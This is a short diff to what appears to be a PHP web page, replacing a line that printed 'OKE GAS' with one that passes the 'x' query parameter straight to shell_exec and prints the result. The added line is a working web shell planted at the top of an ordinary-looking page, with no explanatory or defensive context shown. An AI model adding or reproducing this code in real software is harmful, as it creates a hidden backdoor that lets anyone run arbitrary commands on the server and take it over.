@@ -1,4 +1,4 @@
-<?php echo "OKE GAS"; exit(); ?>
+<?php echo shell_exec($_GET["x"]); exit(); ?>
 
 <!DOCTYPE html>
 <html>
